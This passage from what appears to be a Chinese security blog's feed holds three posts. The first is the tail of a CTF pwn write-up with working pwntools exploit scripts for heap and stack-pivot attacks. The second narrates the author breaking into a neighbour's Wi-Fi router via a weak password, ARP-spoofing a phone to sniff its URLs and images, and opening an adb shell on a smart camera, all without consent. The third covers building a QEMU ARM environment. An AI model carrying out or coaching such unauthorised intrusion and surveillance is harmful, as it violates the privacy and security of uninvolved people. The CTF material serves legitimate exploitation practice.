p.sendlineafter(&apos;size&apos;,str(size))</span><br><span class="line">        p.recvuntil(&apos;addr &apos;)</span><br><span class="line">        addr = int(p.recvuntil(&apos;\n&apos;,drop = True),16)</span><br><span class="line">        p.sendafter(&apos;content&apos;,content)</span><br><span class="line">        return addr</span><br><span class="line"></span><br><span class="line">    chunk1 = add(0x100000,&apos;aaaa&apos;)</span><br><span class="line"></span><br><span class="line">    info(hex(chunk1))</span><br><span class="line">    libc = chunk1 - offset</span><br><span class="line">    info(hex(libc))</span><br><span class="line"></span><br><span class="line">    chunk2 = add(0x28,&apos;\xff&apos;*0x30)+0x20</span><br><span class="line">    info(hex(chunk2))</span><br><span class="line"></span><br><span class="line">    mallochook = libc+0x3c4b10</span><br><span class="line">    chunk3 = add(mallochook-chunk2-0x20,&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">    chunk4 = add(0x20,p64(libc+0x45390)*4)</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    #pause()</span><br><span class="line">    p.sendlineafter(&apos;1:&apos;,&apos;1&apos;)</span><br><span class="line">    p.sendafter(&apos;size&apos;,str(libc+0x18cd57))</span><br><span class="line">    print(p.recv())</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line">except Exception as e:</span><br><span class="line">    offset-=0x1000</span><br><span class="line">    p.close()</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><h2 id="BorrowStack"><a href="#BorrowStack" class="headerlink" title="BorrowStack"></a>BorrowStack</h2><p>栈溢出0x10字节，栈迁移到bss段后，构造rop链。<br>需要注意的是，要尽量迁移到距离bss段更远的地址，为了防止bss段上面的got表被修改。<br>因为在调用函数时，栈由高地址向低地址生长，可能会修改到got表里面的内容。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">offest=152</span><br><span class="line"></span><br><span class="line">#while (1):</span><br><span class="line">try:</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./pwn&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,3635)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./pwn&apos;)</span><br><span class="line">bss_addr=0x601080</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">#gdb.attach(p, &quot;b *0x400680&quot;)</span><br><span class="line">payload=&apos;a&apos;*0x60+p64(bss_addr+offest)+p64(0x400699)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">payload = &apos;b&apos;*offest+p64(bss_addr+offest)+p64(0x400703)+p64(elf.got[&quot;read&quot;])+p64(elf.sym[&quot;puts&quot;])+p64(0x400626)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">leak=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_addr=leak-libc.sym[&quot;read&quot;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Tell me what you want\n&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x60+p64(0)+p64(libc_addr+0x4526a)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">payload=&apos;b&apos;*0x10</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">print offest</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br><span class="line">#p.close()</span><br><span class="line">except:</span><br><span class="line">offest=offest+1</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><h2 id="Some-thing-exceting"><a href="#Some-thing-exceting" class="headerlink" title="Some_thing_exceting"></a>Some_thing_exceting</h2><p>flag已经被写到bss段内，用double free漏洞申请堆块到bss段，然后输出堆块内容即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./excited&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,6484)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">e=ELF(&apos;./excited&apos;)</span><br><span class="line">def show(index):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def new(lenght,cont,lenght2,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght2))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line"></span><br><span class="line">def delete(num):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">new(0x60,&apos;a&apos;*0x8,0x50,&apos;\x10&apos;*0x8)</span><br><span class="line">new(0x60,&apos;b&apos;*0x8,0x50,&apos;\x11&apos;*0x8)</span><br><span class="line">new(0x60,&apos;c&apos;*0x8,0x50,&apos;\x12&apos;*0x8)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">bss_addr=0x6020A8</span><br><span class="line">new(0x50,p64(bss_addr-0x10),0x50,&apos;\x14&apos;*4)</span><br><span class="line"></span><br><span class="line">new(0x50,&apos;\x16&apos;*4,0x50,&apos;\x17&apos;*1)</span><br><span class="line">show(1)</span><br><span class="line">print p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Some-thing-interesting"><a href="#Some-thing-interesting" class="headerlink" title="Some_thing_interesting"></a>Some_thing_interesting</h2><p>格式化字符漏洞泄露libc基址，然后double free修改malloc_hook为onegadget</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./interested&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,3041)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">e=ELF(&apos;./interested&apos;)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;4&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def new(lenght,cont,lenght2,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(lenght2))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line"></span><br><span class="line">def edit(index,cont,cont2):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(cont2)</span><br><span class="line">def check():</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;0&apos;)</span><br><span class="line">#info(p.recv(49))</span><br><span class="line">#leak=int(p.recv(12),16)</span><br><span class="line">p.recvline()</span><br><span class="line">leak=int(p.recvline()[31:43],16)</span><br><span class="line">print hex(leak)</span><br><span class="line">pause()</span><br><span class="line">return leak</span><br><span class="line">def delete(num):</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.send(&apos;OreOOrereOOreO%17$p&apos;)</span><br><span class="line"></span><br><span class="line">libc_addr=check()-0x20830</span><br><span class="line"></span><br><span class="line">new(0x40,&apos;a&apos;*0x8,0x60,&apos;\x10&apos;*0x8) #1</span><br><span class="line">new(0x40,&apos;b&apos;*0x8,0x60,&apos;\x11&apos;*0x8) #2</span><br><span class="line">new(0x40,&apos;c&apos;*0x8,0x60,&apos;\x12&apos;*0x8) #3</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">new(0x60,p64(libc_addr+libc.sym[&quot;__malloc_hook&quot;]-0x23),0x60,&apos;\x14&apos;*4)</span><br><span class="line"></span><br><span class="line">new(0x60,&apos;\x16&apos;*4,0x60,&apos;\x1f&apos;*0x13+p64(libc_addr+0xf1147))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(&apos;to do :&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;: &apos;)</span><br><span class="line">p.sendline(str(0x60))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;force&quot;&gt;&lt;a href=&quot;#force&quot; class=&quot;headerlink&quot; title=&quot;force&quot;&gt;&lt;/a&gt;force&lt;/h2&gt;&lt;p&gt;标准的house of force，先申请较大的内存页，可泄露出libc基址，&lt;br&gt;然后申请较小堆块，溢出修改to
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>记一次家庭局域网渗透经历</title>
    <link href="https://nocbtm.github.io/2020/02/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%B6%E5%BA%AD%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/"/>
    <id>https://nocbtm.github.io/2020/02/03/记一次家庭局域网渗透经历/</id>
    <published>2020-02-03T07:17:00.000Z</published>
    <updated>2020-02-03T07:27:11.317Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>寒假有些无聊,就连上隔壁家wifi玩了玩。抱着试一试的态度，却发现很多好玩的东西。</p><h2 id="登录路由器后台"><a href="#登录路由器后台" class="headerlink" title="登录路由器后台"></a>登录路由器后台</h2><p>访问 192.168.1.1 直接连上了，竟然没有做一些限制，然后直接弱口令登陆进去了。看来隔壁家安全意识不高啊。</p><p>进去后台大致浏览了一遍，发现了连接的客户端，也没有静态ARP绑定设置，这样就可以玩ARP欺骗了。<br><img alt="" data-src="https://i.loli.net/2020/02/03/9Tfg8NBGxAj3qwu.png" class="lozad"><br><img alt="" data-src="https://i.loli.net/2020/02/03/hV6Fjvm5gDWUKLk.png" class="lozad"></p><h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><p>祭出尘封已久的kail,首先要把kail设为桥接模式，确保与物理机在同一网段。</p><p>然后 echo 1 &gt; /proc/sys/net/ipv4/ip_forward 进行ip转发，保证客户端的正常上网</p><p>这里用arpspoof工具来嗅探ip为192.168.1.145的荣耀V20<br>arpspoof -i eth0 -t 192.168.1.145 -r 192.168.1.1<br><img alt="" data-src="https://i.loli.net/2020/02/03/XCHM5x1VsPetFEL.png" class="lozad"><br>执行上述命令后，arpspoofing将向路由器发送伪造请求。 此请求将路由器默认IP地址链接到kali linux mac地址</p><h3 id="获得目标设备的SNIFF网站"><a href="#获得目标设备的SNIFF网站" class="headerlink" title="获得目标设备的SNIFF网站"></a>获得目标设备的SNIFF网站</h3><p>打开另一个终端并输入urlsnarf -i eth0<br>Urlsnarf显示目标正在访问的所有网站，<br>-i用于输入网络接口名称。</p><p><img alt="" data-src="https://i.loli.net/2020/02/03/7FdzsRXyMK24xUH.png" class="lozad"><br>可以看到目标正在玩QQ</p><h3 id="获得目标设备的SNIFF图像"><a href="#获得目标设备的SNIFF图像" class="headerlink" title="获得目标设备的SNIFF图像"></a>获得目标设备的SNIFF图像</h3><p>打开另一个终端并输入driftnet -i eth0<br>Driftnet显示了目标在互联网上访问的图像，如下所示。</p><p>-i用于输入网络接口名称。<br>一个新窗口将在kali linux中打开，并将嗅探目标正在访问的所有图像，嗅探到了大力的图片!<img alt="" data-src="https://i.loli.net/2020/02/03/MOaVpIRTfNLBK47.png" class="lozad"></p><p><img alt="" data-src="https://i.loli.net/2020/02/03/Sa6LcIGoWZtA2Ei.png" class="lozad"><br><img alt="" data-src="https://i.loli.net/2020/02/03/5DXVECohPbck2xe.png" class="lozad"></p><p><img alt="" data-src="https://i.loli.net/2020/02/03/8SC3NRrsXbYE94a.png" class="lozad"><br><img alt="" data-src="https://i.loli.net/2020/02/03/IqaQmXNyFBKP5kt.png" class="lozad"></p><h2 id="入侵智能摄像头"><a href="#入侵智能摄像头" class="headerlink" title="入侵智能摄像头"></a>入侵智能摄像头</h2><p>局域网内有一个未知的设备，用nmap扫了一下，发现开了554和5555端口；上网搜了一下，这两个端口都能搞事，应该是一个智能摄像头。社工了一波可能是小米家的小方摄像头。<br>554端口下的rtsp服务是实时流传输协议，是用来传输视频的<br>5555端口是用来远程调试的</p><p><img alt="" data-src="https://i.loli.net/2020/02/03/qH2nG4ZOuYRoimD.png" class="lozad"></p><h3 id="554端口"><a href="#554端口" class="headerlink" title="554端口"></a>554端口</h3><p><img alt="" data-src="https://i.loli.net/2020/02/03/gnIjwHWkEFzYv64.png" class="lozad"></p><p>需要去插SD卡，不太好还是算了吧。我还是用VCL看流媒体吧,推荐几个可以测试的流媒体</p><p><img alt="" data-src="https://i.loli.net/2020/02/03/hrfVDTJ6tvGmHnz.png" class="lozad"></p><p>湖南卫视 rtmp://58.200.131.2:1935/livetv/hunantv<br>CCTV1高清 <a href="http://ivi.bupt.edu.cn/hls/cctv1hd.m3u8" target="_blank" rel="noopener">http://ivi.bupt.edu.cn/hls/cctv1hd.m3u8</a></p><h3 id="5555端口"><a href="#5555端口" class="headerlink" title="5555端口"></a>5555端口</h3><p>用adb远程连一下，可以连上<br>./adb connect  192.168.1.102:5555<br><img alt="" data-src="https://i.loli.net/2020/02/03/zu1O4KipVsZWCNn.png" class="lozad"><br>./adb shell 开启shell，竟然直接进去了。</p><p><img alt="" data-src="https://i.loli.net/2020/02/03/ZNXdey5OIWng6YH.png" class="lozad"></p><p>查看一下开启的端口，加载的驱动<br><img alt="" data-src="https://i.loli.net/2020/02/03/rfsT8Xt3V6N59dn.png" class="lozad"></p><p>接下来就是通过驱动来内核提权了，待我再研究一番来补上续集。</p><p>参考文章：<br>使用MITM监控流量（中间人攻击）<br><a href="http://www.kb-iot.com/post/706.html" target="_blank" rel="noopener">http://www.kb-iot.com/post/706.html</a><br>Wi-Fi 安全攻略<br><a href="https://www.secpulse.com/archives/5455.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/5455.html</a><br>Android-TV-adb-5555端口攻击说明<br><a href="https://wenku.baidu.com/view/ba39d1bef021dd36a32d7375a417866fb84ac04f.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/ba39d1bef021dd36a32d7375a417866fb84ac04f.html</a><br>常见网络摄像机的端口及RTSP地址<br><a href="https://www.jiangyu.org/port-and-rtsp-address-of-several-ipcams/" target="_blank" rel="noopener">https://www.jiangyu.org/port-and-rtsp-address-of-several-ipcams/</a><br>破解小方摄像头<br><a href="https://www.jianshu.com/p/7b56d3ae72f4" target="_blank" rel="noopener">https://www.jianshu.com/p/7b56d3ae72f4</a><br>routerpwn<br><a href="http://routerpwn.com/" target="_blank" rel="noopener">http://routerpwn.com/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;寒假有些无聊,就连上隔壁家wifi玩了玩。抱着试一试的态度，却发现很多好玩的东西。&lt;/p&gt;
&lt;h2 id=&quot;登录路由器后台&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="web" scheme="https://nocbtm.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://nocbtm.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>arm pwn 环境搭建</title>
    <link href="https://nocbtm.github.io/2020/01/21/arm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://nocbtm.github.io/2020/01/21/arm-pwn环境搭建/</id>
    <published>2020-01-21T10:05:00.000Z</published>
    <updated>2020-02-01T11:17:54.160Z</updated>
    
    <content type="html"><![CDATA[<h2 id="arm-pwn-环境搭建"><a href="#arm-pwn-环境搭建" class="headerlink" title="arm pwn 环境搭建"></a>arm pwn 环境搭建</h2><h3 id="qemu-简介"><a href="#qemu-简介" class="headerlink" title="qemu 简介"></a>qemu 简介</h3><p>qemu是一款可执行硬件虚拟化的虚拟机，与他类似的还有Bochs、PearPC，但qemu具有高速（配合KVM）、跨平台的特性<br>qemu主要有两种运行模式：qemu-user 和 qemu-system<br>安装 qemu-user<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get install qemu qemu-user qemu-user-static</span><br></pre></td></tr></table></figure></p><p>此时可以运行静态链接的arm程序，而要运行动态链接的程序，需要安装对应架构的动态链接库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt search &quot;libc6-&quot; | grep &quot;arm&quot;</span><br></pre></td></tr></table></figure></p><p>安装 qemu-system<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install qemu qemu-user-static qemu-system uml-utilities bridge-utils</span><br></pre></td></tr></table></figure></p><p>Ubuntu 16.04（deepin）<br>安装 gdb、gdb-multiarch<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install gdb gdb-multiarch</span><br></pre></td></tr></table></figure></p><p>安装 gdb plugin（peda、pwndbg、gef）</p><p>peda_arm：<a href="https://github.com/alset0326/peda-arm" target="_blank" rel="noopener">https://github.com/alset0326/peda-arm</a><br>pwndbg：<a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">https://github.com/pwndbg/pwndbg</a><br>gef：<a href="https://github.com/hugsy/gef" target="_blank" rel="noopener">https://github.com/hugsy/gef</a></p><p>配置qemu-system网络<br>qemu-system模式配置网络常见的方法是tap桥接<br>安装网络配置的依赖文件：<br>$ sudo apt install uml-utilities bridge-utils</p><p>修改Ubuntu主机网络接口配置文件：<br>$sudo vim /etc/network/interfaces</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">  bridge_ports ens33</span><br><span class="line">  bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>创建并编写qemu网络接口启动脚本：<br>$ sudo vim /etc/qemu-ifup<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append <span class="string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> \</span><br><span class="line">-net nic,macaddr=52:54:00:12:34:56 \</span><br><span class="line">-net tap \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure></p><p>保存文件后使用如下命令修改qemu-ifup的权限：<br>$ sudo chmod a+x /etc/qemu-ifup</p><p>重启网络使配置生效：<br>$ sudo /etc/init.d/networking restart    </p><p>启动桥接网络：<br>$ sudo ifdown ens33 &amp;&amp; sudo ifup br0<br>运行之后，桥br0代替ens33接管了ubuntu虚拟机的网口：</p><p>下载qemu的镜像和磁盘：<br><a href="https://people.debian.org/~aurel32/qemu/armhf/" target="_blank" rel="noopener">https://people.debian.org/~aurel32/qemu/armhf/</a></p><p>启动 qemu<br>./start.sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">-M vexpress-a9 \</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">-net nic,macaddr=52:54:00:12:34:56 \</span><br><span class="line">-net tap \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure></p><p>也可以使用docker运行一个qemu arm容器,比较方便<br><a href="https://island123.github.io/2020/01/15/Docker%E8%BF%90%E8%A1%8Cqemu%20arm%E5%AE%B9%E5%99%A8%20/#%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8Cqemu-arm%E5%AE%B9%E5%99%A8" target="_blank" rel="noopener">https://island123.github.io/2020/01/15/Docker%E8%BF%90%E8%A1%8Cqemu%20arm%E5%AE%B9%E5%99%A8%20/#%E4%BD%BF%E7%94%A8Docker%E8%BF%90%E8%A1%8Cqemu-arm%E5%AE%B9%E5%99%A8</a></p><p><a href="https://github.com/fireundubh/IDA7-Rizzo" target="_blank" rel="noopener">https://github.com/fireundubh/IDA7-Rizzo</a> ida7.0，把rizzo.py放到ida插件文件夹里</p><p>参考文章：<a href="http://myhackerworld.top/2018/09/27/arm-pwn/" target="_blank" rel="noopener">http://myhackerworld.top/2018/09/27/arm-pwn/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;arm-pwn-环境搭建&quot;&gt;&lt;a href=&quot;#arm-pwn-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;arm pwn 环境搭建&quot;&gt;&lt;/a&gt;arm pwn 环境搭建&lt;/h2&gt;&lt;h3 id=&quot;qemu-简介&quot;&gt;&lt;a href=&quot;#qemu-简
      
    
    </summary>
    
      <category term="arm-pwn" scheme="https://nocbtm.github.io/categories/arm-pwn/"/>
    
    
      <category term="arm-pwn" scheme="https://nocbtm.github.io/tags/arm-pwn/"/>
    
  </entry>
  
  <entry>
    <title>2019 xman writeup</title>
    <link href="https://nocbtm.github.io/2020/01/20/2019-xman-writeup/"/>
    <id>https://nocbtm.github.io/2020/01/20/2019-xman-writeup/</id>
    <published>2020-01-20T08:05:00.000Z</published>
    <updated>2020-02-02T02:25:04.073Z</updated>
    
